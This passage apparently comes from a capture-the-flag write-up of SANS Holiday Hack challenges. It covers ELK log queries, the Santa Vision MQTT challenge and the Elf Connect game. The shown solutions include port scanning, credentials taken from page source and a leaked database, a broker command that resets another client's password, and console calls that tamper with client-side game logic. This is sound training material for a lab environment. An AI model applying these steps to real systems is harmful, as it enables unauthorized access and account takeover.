\"AUDIT_SUCCESS\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 4624, \"SourceName\": \"Microsoft-Windows-Security-Auditing\", \"ProviderGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\", \"Version\": 2, \"Task\": 12544, \"OpcodeValue\": 0, \"RecordNumber\": 530313, \"ActivityID\": \"{D72392BD-843F-0000-1F93-23D73F84DA01}\", \"ProcessID\": 704, \"ThreadID\": 1124, \"Channel\": \"Security\", \"Category\": \"Logon\", \"Opcode\": \"Info\", \"SubjectUserSid\": \"S-1-5-18\", \"SubjectUserName\": \"DC01$\", \"SubjectDomainName\": \"NORTHPOLE\", \"SubjectLogonId\": \"0x3e7\", \"TargetUserSid\": \"S-1-5-21-3699322559-1991583901-1175093138-1112\", \"TargetUserName\": \"nutcrakr\", \"TargetDomainName\": \"NORTHPOLE\", \"TargetLogonId\": \"0xdd425e\", \"LogonType\": 10, \"LogonProcessName\": \"User32 \", \"AuthenticationPackageName\": \"Negotiate\", \"WorkstationName\": \"DC01\", \"LogonGuid\": \"{00000000-0000-0000-0000-000000000000}\", \"TransmittedServices\": \"-\", \"LmPackageName\": \"-\", \"KeyLength\": 0, \"ProcessName\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"IpAddress\": \"10.12.25.24\", \"IpPort\": 0, \"ImpersonationLevel\": \"%%1833\", \"RestrictedAdminMode\": \"%%1843\", \"TargetOutboundUserName\": \"-\", \"TargetOutboundDomainName\": \"-\", \"VirtualAccount\": \"%%1843\", \"TargetLinkedLogonId\": \"0xdd41af\", \"ElevatedToken\": \"%%1843\", \"EventReceivedTime\": \"2024-09-16T11:35:57-04:00\", \"SourceModuleName\": \"inSecurityEvent\", \"SourceModuleType\": \"im_msvistalog\", \"Subject_SecurityID\": \"S-1-5-18\", \"Subject_AccountName\": \"DC01$\", \"Subject_AccountDomain\": \"NORTHPOLE\", \"Subject_LogonID\": \"0x3E7\", \"LogonInformation_LogonType\": 10, \"LogonInformation_RestrictedAdminMode\": \"No\", \"LogonInformation_VirtualAccount\": \"No\", \"LogonInformation_ElevatedToken\": \"No\", \"NewLogon_SecurityID\": \"S-1-5-21-3699322559-1991583901-1175093138-1112\", \"NewLogon_AccountName\": \"nutcrakr\", \"NewLogon_AccountDomain\": \"NORTHPOLE\", \"NewLogon_LogonID\": \"0xDD425E\", \"NewLogon_LinkedLogonID\": \"0xDD41AF\", \"NewLogon_NetworkAccountName\": \"-\", \"NewLogon_NetworkAccountDomain\": \"-\", \"NewLogon_LogonGUID\": \"{00000000-0000-0000-0000-000000000000}\", \"ProcessInformation_ProcessID\": \"0x994\", \"ProcessInformation_ProcessName\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"NetworkInformation_WorkstationName\": \"DC01\", \"NetworkInformation_SourceNetworkAddress\": \"10.12.25.24\", \"NetworkInformation_SourcePort\": 0, \"DetailedAuthenticationInformation_LogonProcess\": \"User32\", \"DetailedAuthenticationInformation_AuthenticationPackage\": \"Negotiate\", \"DetailedAuthenticationInformation_TransitedServices\": \"-\", \"DetailedAuthenticationInformation_PackageNameNTLMonly\": \"-\", \"DetailedAuthenticationInformation_KeyLength\": 0, \"MoreDetails\": \"An account was successfully logged on.\\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\\nThe network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\nThe impersonation level field indicates the extent to which a process in the logon session can impersonate.\\nThe authentication information fields provide detailed information about this specific logon request.\\n- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.\\n- Transited services indicate which intermediate services have participated in this logon request.\\n- Package name indicates which sub-protocol was used among the NTLM protocols.\\n- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"}\n</code></pre> <p>Answer: <code>2024-09-16T15:35:57.000Z</code></p> Solution to question 20 <p>Question</p> <p>The attacker is trying to create their own naughty and nice list! What is the full file path they created using their remote desktop connection?</p> <pre><code>cat windows.log | grep 'logonid\": \"0xDD425E' -i | grep \"command\" -i | grep \"WishLists\"\n\n&lt;134&gt;1 2024-09-16T11:36:28-04:00 dc01.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-16 11:36:28\", \"Hostname\": \"dc01.northpole.local\", \"Keywords\": -9223372036854775808, \"EventType\": \"INFO\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 1, \"SourceName\": \"Microsoft-Windows-Sysmon\", \"ProviderGuid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\", \"Version\": 5, \"Task\": 1, \"OpcodeValue\": 0, \"RecordNumber\": 641, \"ProcessID\": 6468, \"ThreadID\": 4816, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Domain\": \"NT AUTHORITY\", \"AccountName\": \"SYSTEM\", \"UserID\": \"S-1-5-18\", \"AccountType\": \"User\", \"Category\": \"Process Create (rule: ProcessCreate)\", \"Opcode\": \"Info\", \"RuleName\": \"-\", \"UtcTime\": \"2024-09-16T11:36:28-04:00\", \"ProcessGuid\": \"{f151dc49-502c-660c-8702-000000000900}\", \"Image\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\", \"FileVersion\": \"10.0.17763.1697 (WinBuild.160101.0800)\", \"Description\": \"Notepad\", \"Product\": \"Microsoft\\u00ae Windows\\u00ae Operating System\", \"Company\": \"Microsoft Corporation\", \"OriginalFileName\": \"NOTEPAD.EXE\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\system32\\\\NOTEPAD.EXE\\\" C:\\\\WishLists\\\\santadms_only\\\\its_my_fakelst.txt\", \"CurrentDirectory\": \"C:\\\\WishLists\\\\santadms_only\\\\\", \"User\": \"NORTHPOLE\\\\nutcrakr\", \"LogonGuid\": \"{f151dc49-500d-660c-5e42-dd0000000000}\", \"LogonId\": \"0xdd425e\", \"TerminalSessionId\": 2, \"IntegrityLevel\": \"Medium\", \"Hashes\": \"MD5=5394096A1CEBF81AF24E993777CAABF4,SHA256=A28438E1388F272A52559536D99D65BA15B1A8288BE1200E249851FDF7EE6C7E,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E\", \"ParentProcessGuid\": \"{f151dc49-500f-660c-5902-000000000900}\", \"ParentProcessId\": 1364, \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\Explorer.EXE\", \"ParentUser\": \"NORTHPOLE\\\\nutcrakr\", \"EventReceivedTime\": \"2024-09-16T11:36:28-04:00\", \"SourceModuleName\": \"inSysmon\", \"SourceModuleType\": \"im_msvistalog\", \"ProcessId\": 9152, \"MoreDetails\": \"Process Create:\"}\n</code></pre> <p>Answer: <code>C:\\WishLists\\santadms_only\\its_my_fakelst.txt</code></p> Solution to question 21 <p>Question</p> <p>The Wombley faction has user accounts in our environment. How many unique Wombley faction users sent an email message within the domain?</p> <pre><code>cat mail.log | cut -d '\"' -f 4 | grep \".local\" | sort | uniq\n\nasnowball04@northpole.local\nasnowball_05@northpole.local\nasnowball08@northpole.local\nasnowball09@northpole.local\nelf_user00@northpole.local\nelf_user01@northpole.local\nelf_user02@northpole.local\nelf_user03@northpole.local\nelf_user04@northpole.local\nelf_user05@northpole.local\nelf_user06@northpole.local\nelf_user07@northpole.local\nelf_user08@northpole.local\nelf_user09@northpole.local\nelf_user10@northpole.local\nelf_user11@northpole.local\nkriskring1e@northpole.local\nwcub101@northpole.local\nwcub303@northpole.local\nwcub808@northpole.local\nwcube311@northpole.local\n</code></pre> <p>Answer: <code>4</code></p> Solution to question 22 <p>Question</p> <p>The Alabaster faction also has some user accounts in our environment. How many emails were sent by the Alabaster users to the Wombley faction users?</p> <pre><code>cat mail.log | grep 'From\": \"asnowball' | grep 'To\": \"wcub' | wc -l\n\n22\n</code></pre> <p>Answer: <code>22</code></p> Solution to question 23 <p>Question</p> <p>Of all the reindeer, there are only nine. What's the full domain for the one whose nose does glow and shine? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.</p> <pre><code>cat mail.log | grep 'rudolph' -i\n\n...\n&lt;134&gt;1 2024-09-16T11:58:37-04:00 SecureElfGwy SnowGlowMailPxy - - - {\"From\": \"RudolphRunner@rud01ph.glow\", \"To\": \"elf_user05@northpole.local\", \"Subject\": \"Diversity and Inclusion Initiatives at The North Pole\", \"Date\": null, \"Message-ID\": \"&lt;A1E38EA6-50AF-47FA-A3FE-4C16B0084B2A@SecureElfGwy.northpole.local&gt;\", \"Return-Path\": \"NorthPolePostmaster@northpole.exchange\", \"Body\": \"elf_user05,\\n\\nI wanted to update you on the latest progress with our\\n\", \"Received_Time\": \"2024-09-16T11:58:37-04:00\", \"ReceivedIP1\": \"172.24.25.25\", \"ReceivedIP2\": \"172.24.25.20\"}\n...\n</code></pre> <p>Answer: <code>rud01ph.glow</code></p> Solution to question 24 <p>Question</p> <p>With a fiery tail seen once in great years, what's the domain for the reindeer who flies without fears? To help you narrow your search, search the events in the 'SnowGlowMailPxy' event source.</p> <pre><code>cat mail.log | grep 'c0m3t' -i\n\n...\n&lt;134&gt;1 2024-09-16T11:55:19-04:00 SecureElfGwy SnowGlowMailPxy - - - {\"From\": \"StockingStitcher@c0m3t.halleys\", \"To\": \"elf_user09@northpole.local\", \"Subject\": \"Training Opportunities at The North Pole\", \"Date\": null, \"Message-ID\": \"&lt;48025832-AF6A-49D9-9664-AB3A0CFC0356@SecureElfGwy.northpole.local&gt;\", \"Return-Path\": \"NorthPolePostmaster@northpole.exchange\", \"Body\": \"Dear elf_user09,\\n\\nI hope this email finds you motivated and ready for new challenges! As we continue to strive for excellence at The North Pole, I wanted to bring to your attention the exciting training opportunities available to all employees. \\n\\nInvesting in our professional development is crucial to stay ahead in the ever-evolving world of technology. Therefore, I would like to inform you about a series of upcoming training sessions and workshops designed to enhance our skills and knowledge.\\n\\n1. Professional Growth Workshop:\\nDate: [Date]\\nTime: [Time]\\nLocation: [Venue]\\nTopic: Building Effective Communication Skills for Team Collaboration\\n\\nThis workshop aims to strengthen our ability to effectively communicate and collaborate within our teams. It will provide practical tips and techniques to improve interpersonal skills, overcome communication barriers, and foster a collaborative work environment.\\n\\n2. Technical Webinar:\\nDate: [Date]\\nTime: [Time]\\nLocation: Online (Webinar Link will be shared separately)\\nTopic: Deep Dive into Data Encryption and Security Best Practices\\n\\nIn this technical webinar, we will explore the latest advancements in data encryption and security. Our experts will discuss current trends, best practices, and demonstrate how we can leverage this knowledge to enhance our projects' security and protection against cyber threats.\\n\\n3. Leadership Development Program:\\nDates: [Date 1], [Date 2], [Date 3], [Date 4]\\nTime: [Time]\\nLocation: [Venue]\\nTheme: Leading with Innovation and Adaptability\\n\\nThe Leadership Development Program is tailored for high-potential individuals aspiring to take on leadership roles. This program will cover various aspects of effective leadership, including fostering innovation, adaptability, and managing change. Participants will gain insights from experienced leaders within our organization and have the chance to engage in interactive discussions and case studies.\\n\\nTo register for any of these training opportunities, please click on the provided link: [Registration Link]. Kindly note that seats are limited, and registrations will be accepted on a first-come, first-served basis.\\n\\nRemember, learning never stops, and continuous improvement is key to our success. I encourage you to take advantage of these training initiatives and further augment your capabilities.\\n\\nIf you have any questions or require further information, please do not hesitate to reach out to me or our dedicated HR team at [HR Contact Information].\\n\\nTogether, let's unlock our potential and embrace the path of endless possibilities!\\n\\nWarm regards,\\n\\nStockingStitcher\\n\", \"Received_Time\": \"2024-09-16T11:55:19-04:00\", \"ReceivedIP1\": \"172.24.25.25\", \"ReceivedIP2\": \"172.24.25.20\"}\n...\n</code></pre> <p>Answer: <code>c0m3t.halleys</code></p>"},{"location":"act_3/elf_stack/#response","title":"Response","text":"Fitzy Shortstack <p>Fantastic job! You worked through the logs using the ELK stack like a pro\u2014efficient, quick, and spot-on. Maybe, just maybe, this will turn Santa\u2019s frown upside down!</p> <p>Unbelievable! You dissected the attack chain using advanced analysis\u2014impressive work! With determination like yours, we might just fix the mess and get Santa smiling again.</p> <p>Bravo! You pieced it all together, uncovering the attack path. Santa\u2019s gonna be grateful for your quick thinking and tech savvyness. The North Pole owes you big time!</p>"},{"location":"act_3/santa_vision/","title":"Santa Vision","text":"<p>Difficulty: </p>"},{"location":"act_3/santa_vision/#objective","title":"Objective","text":"<p>Task description</p> <p>Alabaster and Wombley have poisoned the Santa Vision feeds! Knock them out to restore everyone back to their regularly scheduled programming.</p> <ul> <li> <p>Santa Vision A (): What username logs you into the SantaVision portal?</p> </li> <li> <p>Santa Vision B (): Once logged on, authenticate further without using Wombley's or Alabaster's accounts to see the <code>northpolefeeds</code> on the monitors. What username worked here?</p> </li> <li> <p>Santa Vision C (): Using the information available to you in the SantaVision platform, subscribe to the <code>frostbitfeed</code> MQTT topic. Are there any other feeds available? What is the code name for the elves' secret operation?</p> </li> <li> <p>Santa Vision D (): There are too many admins. Demote Wombley and Alabaster with a single MQTT message to correct the <code>northpolefeeds</code> feed. What type of contraption do you see Santa on?</p> </li> </ul> Ribb Bonbowford <p>Hi, Ribb Bonbowford here, ready to guide you through the SantaVision dilemma!</p> <p>The Santa Broadcast Network (SBN) has been hijacked by Wombley's goons\u2014they're using it to spread propaganda and recruit elves! And Alabaster joined in out of necessity. Quite the predicament, isn\u2019t it?</p> <p>To access this challenge, use this terminal to access your own instance of the SantaVision infrastructure.</p> <p>Once it's done baking, you'll see an IP address that you'll need to scan for listening services.</p> <p>Our target is the technology behind the SBN. We need make a key change to its configuration.</p> <p>We\u2019ve got to remove their ability to use their admin privileges. This is a delicate maneuver\u2014are you ready?</p> <p>We need to change the application so that multiple administrators are not permitted. A misstep could cause major issues, so precision is key.</p> <p>Once that\u2019s done, positive, cooperative images will return to the broadcast. The holiday spirit must prevail!</p> <p>This means connecting to the network and pinpointing the right accounts. Don\u2019t worry, we'll get through this.</p> <p>Let\u2019s ensure the broadcast promotes unity among the elves. They deserve to see the season\u2019s spirit, don't you think?</p> <p>Remember, it\u2019s about cooperation and togetherness. Let's restore that and bring back the holiday cheer. Best of luck!</p> <p>The first step to unraveling this mess is gaining access to the SantaVision portal. You'll need the right credentials to slip through the front door\u2014what username will get you in?</p>"},{"location":"act_3/santa_vision/#hints","title":"Hints","text":"Misplaced Credentials (Santa Vision A) <p>See if any credentials you find allow you to subscribe to any MQTT feeds.</p> Filesystem Analysis (Santa Vision A) <p>jefferson is great for analyzing JFFS2 file systems.</p> Database Pilfering (Santa Vision A) <p>Consider checking any database files for credentials...</p> Mosquito Mosquitto <p>Mosquitto is a great client for interacting with MQTT, but their spelling may be suspect. Prefer a GUI? Try MQTTX</p>"},{"location":"act_3/santa_vision/#solution","title":"Solution","text":"<p>This challenge uses a system that launches a private server instance for you to work with using GateXOR. We simply have to click \"Time Travel\" for it to start an instance for us. GateXOR itself is not part of the challenge.</p> A - SilverA - GoldB - SilverB - GoldC - SilverC - GoldD - SilverD - Gold <p>As we receive an IP, we start out doing some recon activities using nmap. We find an open SSH port (22), a MQTT port (1883), an alternative HTTP port (8000), and a port the purpose is initially unclear for (9001).</p> Nmap usage <pre><code>nmap -vv 35.226.210.136 -p-\n\n...\nHost is up, received conn-refused (0.13s latency).\nScanned at 2024-12-02 20:27:55 CET for 405s\nNot shown: 65522 closed tcp ports (conn-refused)\nPORT     STATE    SERVICE      REASON\n22/tcp   open     ssh          syn-ack\n25/tcp   filtered smtp         no-response\n135/tcp  filtered msrpc        no-response\n136/tcp  filtered profile      no-response\n137/tcp  filtered netbios-ns   no-response\n138/tcp  filtered netbios-dgm  no-response\n139/tcp  filtered netbios-ssn  no-response\n427/tcp  filtered svrloc       no-response\n445/tcp  filtered microsoft-ds no-response\n1883/tcp open     mqtt         syn-ack\n5355/tcp filtered llmnr        no-response\n8000/tcp open     http-alt     syn-ack\n9001/tcp open     tor-orport   syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 405.45 seconds\n</code></pre> <p>The http-alt port shows us a web application:</p> <p></p> <p>Santa Vision web application.</p> <p>On the bottom we see <code>(topic 'sitestatus' available.)</code>, indicating one of the MQTT topics we can subscribe to. For this challenge we opted for MQTTX. We will first need credentials to connect to the server.</p> <p>We find credentials in the source code of the web application login page:</p> <p><code>&lt;/div&gt; &lt;!-- mqtt: elfanon:elfanon --&gt;</code></p> <p>These can be used to connect to both the MQTT server and login to the web application.</p> <p>Answer</p> <p>The answer is <code>elfanon</code>.</p> <p>Now that we have some credentials, let's start exploring the MQTT feed:</p> <p></p> <p>The MQTTX client connected to the MQTT server and subscribed to the 'sitestatus' feed.</p> <p>One of the messages is interesting as it seems to point to a file we could try to download:</p> <p><code>File downloaded: /static/sv-application-2024-SuperTopSecret-9265193/applicationDefault.bin</code></p> <p>Let's move on to the web application and login using the credentials:</p> <p></p> <p>Santa Vision feed monitor.</p> <p>We download that .bin file and check the file system. It appears to be the filesystem mentioned in the hints:</p> <pre><code>file applicationDefault.bin\n\napplicationDefault.bin: Linux jffs2 filesystem data little endian\n</code></pre> <p>We can unpack this to get some source code of the web application using the jefferson tool:</p> <pre><code>jefferson applicationDefault.bin -d sans_jffs2\n</code></pre> <p>In the filesystem we see a bunch of Python and HTML files. In /app/src/accounts/views.py we see this link to an .sqlite file:</p> <pre><code>@accounts_bp.route(\"/sv2024DB-Santa/SantasTopSecretDB-2024-Z.sqlite\", methods=[\"GET\"])\n</code></pre> <p>We download this file and find the answer:</p> <pre><code>sqlite3 SantasTopSecretDB-2024-Z.sqlite\n\nSQLite version 3.38.5 2022-05-06 15:25:27\nEnter \".help\" for usage hints.\n\nsqlite&gt; .tables\nalembic_version  users\n\nsqlite&gt; SELECT * FROM users;\n1|santaSiteAdmin|S4n+4sr3411yC00Lp455wd|2024-01-23 06:05:29.466071|1\n</code></pre> <p>Answer</p> <p>The answer is <code>santaSiteAdmin</code>.</p> <p>There are more credentials to be found in the source code. In <code>/app/src/core/views.py</code> we find the following:</p> <pre><code>#Publish Messages to Broker to Create Player Broker Clients\nmqttPublish.multiple(CreatePlayerClients,hostname=\"localhost\",port=1883,auth={'username':\"SantaBrokerAdmin\", 'password':\"8r0k3R4d1mp455wD\"})\n</code></pre> <p>We can authenticate to the MQTT server with these credentials in MQTTX.</p> <p>It was mentioned that Eclipse Mosquitto was used. This page describes the security topics available in the server. We can subscribe to them using topic <code>$CONTROL/#</code>, with <code>#</code> being the wildcard symbol in MQTT.</p> <p>The page shares how we can change a password. We want to change the password of <code>elfmonitor</code> as this is the only account no related to Wombley or Alabaster when clicking the \"List Available Clients\" button on the web application:</p> <p><code>Available clients: 'elfmonitor', 'WomblyC', 'AlabasterS'</code></p> <p>We submit the following command to the security topic to see all available clients:</p> <pre><code>{\"commands\": [{\"command\": \"listClients\"}]}\n\n{\"responses\":[{\"command\":\"listClients\",\"data\":{\"totalCount\":11,\"clients\":[\"AlabasterS\",\"AlabasterS-viewer\",\"SantaBrokerAdmin\",\"WomblyC\",\"WomblyC-viewer\",\"elfanon\",\"elfmonitor\",\"elfmonitor-viewer\",\"santaMonitor\",\"santashelper2024\",\"santashelper2024-viewer\"]}}]}\n</code></pre> <p>We want to change the password of <code>elfmonitor-viewer</code> as this is the account for the web application:</p> <pre><code>{\n    \"commands\":[\n        {\n            \"command\": \"setClientPassword\",\n            \"username\": \"elfmonitor-viewer\",\n            \"password\": \"password\"\n        }\n    ]\n}\n</code></pre> <p>This then allows us to connect to the <code>northpolefeeds</code> as <code>elfmonitor</code> with password <code>password</code>. Since it works, we know that this account is the answer.</p> <p>Answer</p> <p>The answer is <code>elfmonitor</code>.</p> <p>We use the credentials we found in \"A - Gold\" to login to the web application. If we look at the response headers in DevTools when loading the page on the <code>/auth</code> endpoint we see the following:</p> <pre><code>brkrpswd: playerSantaHelperPass8274054555\nbrkrtopic: northpolefeeds\nbrkruser: santashelper2024\n</code></pre> <p>We can then use the following settings to power on the monitors (the password seems to be dynamic):</p> <pre><code>Connect as: santashelper2024\nPassword: playerSantaHelperPass8274054555\nCamera Feed Server: YOUR_IP\nCamera Feed Port: 9001\n</code></pre> <p></p> <p>Subscribed to the <code>northpolefeeds</code> topic, providing us a view of various camera feeds.</p> <p>Answer</p> <p>The answer is <code>santashelper2024</code>.</p> <p>Going back to MQTTX, we use the credentials for SantaBrokerAdmin found in \"B - Silver\" to authenticate to the server and subscribe to more topics. MQTT has a wildcard feature where you can subscribe to all topics that don't start with a <code>$</code> (internal topics) using <code>#</code>. We get access to the following feeds:</p> <pre><code>sitestatus\nnorthpolefeed\nfrostbitfeed\nsantafeed\n</code></pre> <p>In the santafeed we find the name of the secret operation:</p> <p><code>Sixteen elves launched operation: Idemcerybu</code></p> <p>Answer</p> <p>The answer is <code>Idemcerybu</code>.</p> <p>The answer for \"C - Silver\" is quite random and not a real word, and therefore suspicious. We have another look at it in CyberChef. By applying <code>ROT13</code> with an amount of <code>10</code> we get a real word.</p> <p>Answer</p> <p>The answer is <code>Snowmobile</code>.</p> <p>We connect to the <code>northpolefeeds</code> topic in the web application using the <code>elfmonitor</code> account we changed the password for in \"B - Silver\". We can then use the DevTools to publish messages to MQTT topics (we could use MQTTX as well but somehow this does not work to complete this challenge).</p> <p>On the <code>santafeed</code> we see the following message come by:</p> <p><code>singleAdminMode=false</code></p> <p>We want to change that to <code>true</code>. Submit the following in the DevTools console, based on the logic we see in <code>mqttJS.js</code>:</p> <pre><code>var topic = \"santafeed\"\nvar msg = \"singleAdminMode=true\"\nmessage = new Paho.MQTT.Message(msg)\nmessage.destinationName=topic\nmqtt.send(message)\n</code></pre> <p>The camera feeds will then change and display Santa:</p> <p></p> <p>Santa using a new type of contraption.</p> <p>Answer</p> <p>The answer is <code>pogo stick</code>.</p> <p>We follow the same logic as for \"D - Silver\", however this time connected as <code>santashelper2024</code> using what we learned in \"B - Gold\".</p> <p></p> <p>Santa has gotton onto some more high-end.</p> <p>Answer</p> <p>The answer is <code>hover craft</code>.</p>"},{"location":"act_3/santa_vision/#response","title":"Response","text":"Ribb Bonbowford <p>The first step to unraveling this mess is gaining access to the SantaVision portal. You'll need the right credentials to slip through the front door\u2014what username will get you in?</p> <p>Great work! You've taken the first step\u2014nicely done. You're on the silver path and off to a strong start!</p> <p>Impressive! You dug deeper and uncovered something hidden\u2014very strategic work. You're well on your way to gold!</p> <p>You've gained access, but there\u2019s still much more to uncover. Patience and persistence will guide you\u2014silver or gold, you're making progress!</p> <p>Excellent progress! You've moved us closer to understanding this network\u2014keep it up on the silver path!</p> <p>(Gold hint) Look beyond the surface. Headers and subtle changes might just open new doors. Pay close attention to everything as you log in.</p> <p>That\u2019s the kind of attention to detail we need! You've uncovered a hidden path\u2014solid gold effort!</p> <p>You're doing fantastic! The northpolefeeds are now in your sights. Silver or gold, you're pushing forward with great momentum!</p> <p>Wonderful job! You've uncovered a critical piece of the puzzle\u2014well on track with the silver approach!</p> <p>(Gold hint) Sometimes the answers are in the quiet moments. Pay attention to every feed and signal\u2014you may find what you're looking for hidden deep in the streams.</p> <p>You're almost there! The operation\u2019s code is unlocked, but the final challenge is waiting. Silver or gold, you're close to victory!</p> <p>It\u2019s time to take back control of the Santa Broadcast Network. There really shouldn't be multiple administrators\u2014send the right message, and Santa\u2019s true spirit will return. What\u2019s Santa test-driving this season?</p> <p>Excellent! You've successfully removed the propaganda and restored the true spirit of the season. A solid silver finish\u2014well done!</p> <p>(Gold hint) Think about the kind of ride Santa would take in a world filled with innovation. His vehicle of choice might surprise you\u2014pay attention to the futuristic details.</p> <p>Phenomenal! You've figured it out\u2014Santa\u2019s on a new ride. You've earned your gold badge with this one!</p> <p>Mission accomplished! The airwaves are restored, and the message is one of unity and teamwork. Whether silver or gold, you've done an incredible job!</p>"},{"location":"prologue/elf_connect/","title":"Elf Connect","text":"<p>Difficulty: </p>"},{"location":"prologue/elf_connect/#objective","title":"Objective","text":"<p>Task description</p> <p>Help Angel Candysalt connect the dots in a game of connections.</p> Angel Candysalt <p>Welcome back, island adventurer! I'm Angel Candysalt \u2014 so happy to finally meet you!</p> <p>I'm thrilled you're here because I could really use a hand with something.</p> <p>Have you ever heard of a game called Connections?</p> <p>It\u2019s simple! All you need to do is find groups of four related words.</p> <p>I've been stuck on it all day, and I'm sure someone as sharp as you will breeze through it.</p> <p>Oh, and while you're at it, check out randomElf's score \u2014 they hit fifty thousand points, which seems\u2026 oddly suspicious.</p> <p>Think they might have tampered with the game? Just a hunch!</p>"},{"location":"prologue/elf_connect/#hints","title":"Hints","text":"Easy <p>I love brain games! This one is like the New York Times Connections game. Your goal here is to find groups of items that share something in common. Think of each group as having a hidden connection or theme\u2014four items belong together, and there are multiple groups to find! See if you can spot patterns or common threads to make connections. Group all the items correctly to win!</p> Hard <p>WOW! A high score of 50,000 points! That\u2019s way beyond the limit! With only four rounds and a max of 400 points per round, the top possible score should be 1,600 points. So, how did someone get to 50,000? Something unusual must be happening!</p> <p>If you're curious, you might want to check under the hood. Try opening the browser's developer tools console and looking around\u2014there might even be a variable named 'score' that could give you some insights. Sometimes, games hold secrets for those who dig a little deeper. Give it a shot and see what you can discover!</p>"},{"location":"prologue/elf_connect/#solution","title":"Solution","text":"SilverGold <p>When interacting with the terminal we get presented a minigame. As said by Angel, the game is called 'Connections', where we get sixteen words and we need to find four groups of four that belong together per round.</p> <p></p> <p>Elf Connect</p> <p>Not being a native English speaker and knowing all of its culture, the first round is actually quite challenging. Fortunately, impatience actually rewards us here as prematurely checking the browser's DevTools quickly gives us insight into the answers when looking at JavaScript embedded in the HTML:</p> <pre><code>const wordSets = {\n    1: [\"Tinsel\", \"Sleigh\", \"Belafonte\", \"Bag\", \"Comet\", \"Garland\", \"Jingle Bells\", \"Mittens\", \"Vixen\", \"Gifts\", \"Star\", \"Crosby\", \"White Christmas\", \"Prancer\", \"Lights\", \"Blitzen\"],\n    2: [\"Nmap\", \"burp\", \"Frida\", \"OWASP Zap\", \"Metasploit\", \"netcat\", \"Cycript\", \"Nikto\", \"Cobalt Strike\", \"wfuzz\", \"Wireshark\", \"AppMon\", \"apktool\", \"HAVOC\", \"Nessus\", \"Empire\"],\n    3: [\"AES\", \"WEP\", \"Symmetric\", \"WPA2\", \"Caesar\", \"RSA\", \"Asymmetric\", \"TKIP\", \"One-time Pad\", \"LEAP\", \"Blowfish\", \"hash\", \"hybrid\", \"Ottendorf\", \"3DES\", \"Scytale\"],\n    4: [\"IGMP\", \"TLS\", \"Ethernet\", \"SSL\", \"HTTP\", \"IPX\", \"PPP\", \"IPSec\", \"FTP\", \"SSH\", \"IP\", \"IEEE 802.11\", \"ARP\", \"SMTP\", \"ICMP\", \"DNS\"]\n};\n...\nlet correctSets = [\n    [0, 5, 10, 14], // Set 1\n    [1, 3, 7, 9],   // Set 2\n    [2, 6, 11, 12], // Set 3\n    [4, 8, 13, 15]  // Set 4\n];\n</code></pre> <p>The correct sets for all rounds are fixed by the index of the words. Parsing this data, we get the following correct sets:</p> <ul> <li>Round 1<ul> <li>Tinsel, Garland, Star, Lights</li> <li>Sleigh, Bag, Mittens, Gifts</li> <li>Belafonte, Jingle Bells, White Christmas, Crosby</li> <li>Comet, Vixen, Crosby, Prancer</li> </ul> </li> <li>Round 2<ul> <li>Nmap, netcat, Wireshark, Nessus</li> <li>burp, OWASP Zap, Nikto, wfuzz</li> <li>Frida, Cycript, AppMon, apktool</li> <li>Metasploit, Cobalt Strike, HAVOC, Empire</li> </ul> </li> <li>Round 3<ul> <li>AES, RSA, Blowfish, 3DES</li> <li>WEP, WPA2, TKIP, LEAP</li> <li>Symmetric, Asymmetric, hash, hybrid</li> <li>Caesar, One-time Pad, Ottendorf, Scytale</li> </ul> </li> <li>Round 4<ul> <li>IGMP, IPX, IP, ICMP</li> <li>TLS, SSL, IPSec, SSH</li> <li>Ethernet, PPP, IEEE 802.11, ARP</li> <li>HTTP, FTP, SMTP, DNS</li> </ul> </li> </ul> <p>Answer</p> <p>Solving the game the way it is meant to be played will give us the silver achievement.</p> <p>The 'hard' hint suggests that we need to use the browser's developer tools (DevTools) to solve this challenge. When looking through the HTML and JavaScript code, we find a function called 'checkSelectedSet' which sounds important. In this function, some logic is executed when a set if deemed correct, like updating the score and check whether a high-score is reached. See the highlighted and annotated code below for more explanation.</p> Executed logic after validating that a set is correct<pre><code>function checkSelectedSet(scene) {\n    // ...\n    if (isCorrectSet) {\n        // ...\n        // Update score by 100 points\n        score += 100; // (1)!\n        scoreText.setText('Score: ' + score);\n\n        // Add high-score board\n        if (score &gt; 50000) { // (2)!\n            highScoreText.setText('High Score: ' + score);\n            emitter.explode(20);\n            submitAction(2); // (3)!\n            displaySuccessMessage('Great Job Hacker! Elf Connect Complete and Hacked!', function () {\n            });\n        }\n    }\n}\n</code></pre> <ol> <li>The 'score' variable is updated after finding a correct set. As this is happening client side, we could alter it ourselves using the console in the DevTools.</li> <li>Validation of the high-score (above 50k).</li> <li>Submitting some action, which appears to be the game ending. Since it submits action '2', there is likely also an action '1'.</li> </ol> <p>Looking through the code we find that <code>submitAction(1)</code> is used after the game is completed by playing it as intended. This submission is therefore likely related to the silver/gold progression. We therefore don't have to manually edit the variable <code>score</code> via the DevTools console as we can directly submit the game winning action. Therefore, the answer is as follows:</p> <p>Answer</p> <p>Submit the following in the DevTools console (make sure to attach the console to the game iframe):</p> <pre><code>submitAction(2)\n</code></pre>"},{"location":"prologue/elf_connect/#response","title":"Response","text":"Angel Candysalt <p>Amazing! You really connected all the dots like a pro.</p>"},{"location":"prologue/elf_minder_9000/","title":"Elf Minder 9000","text":"<p>Difficulty: 